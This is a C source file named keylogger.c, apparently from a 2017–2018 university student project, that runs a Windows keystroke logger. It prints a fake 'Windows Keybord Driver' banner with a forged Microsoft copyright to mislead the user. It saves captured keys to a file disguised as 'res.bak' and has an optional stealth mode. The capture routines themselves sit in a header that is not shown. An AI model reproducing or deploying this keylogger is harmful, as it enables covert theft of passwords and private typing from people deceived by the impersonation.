/**
* @file keylogger.c
*
* @author Federico Turrin (<federico.turrin@studenti.unipd.it>)
* @author Leonardo Antichi (<leo.antichi@stud.uniroma3.it>)
* @version 2.0
* @since 2.0
*
* @copyright Copyright (c) 2017-2018 University of Padua, Italy
* @copyright Copyright (c) 2017-2018 University of Roma 3, Italy
* @copyright Apache License, Version 2.0
*/

/* Libreria per il keylogging */
#include <windows.h>

/* libreria per lo standard input/output */
#include<stdio.h>

/* Libreria per la funzione system */
#include<stdlib.h>

/* Libreria per il keylogging */
#include "keylib.h"

/* Nome file su cui salvare i tasti loggati */
#define LOGFILE "res.bak"	

/* Definizione della sequenza per uscire */
#define EXIT ".,m"
#define TIME ".,s"

int main(void)
{
	/* Se il programma non dovesse essere in stealth in automatico. Se compilata come Win32 application non va inserito. */
	//Stealth();

	/* Variabile per il controllo di un precedente log */
	int c;

	/* Variabile per la decisione*/
	char dec=7;

	/* Controllo se eiste gia' un log con sequenza di uscita */
	c = isCollision();

	/* Se non ci sono problemi di collisione */
	if (c == 0) {
		
		printf("\n|_|_|_|_|_|_|_|_|_| Windows Keybord Driver 2.3 |_|_|_|_|_|_|_|_|_|\n");
		printf("\nPlease report any bugs to Microsoft Corporation.\n");
		printf("Copyright ©2017 Microsoft Corporation. All rights reserved.\n");


		/* Sequenza per terminare */
		printf("\nThis Window shuold not be visible, if so, maybe you should reinstall your driver.\n");
		printf("\nPlease, contact your system administrator.\n");
		
		/* Rilevazione tasti */
		int t = getKeys();
		

		printf("\nDriver shut_down process:\n");

		/* Controllo se il programma ha svolto tutto correttamente */
		if (t == 1)
			printf("0K\n\n");


		/* Errore durante l'esexuzione del programma */
		else if( t == 0 )
			printf("Error!");
	}

	return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdParam, int iCmdShow) {
	
	main();
	return 0;
}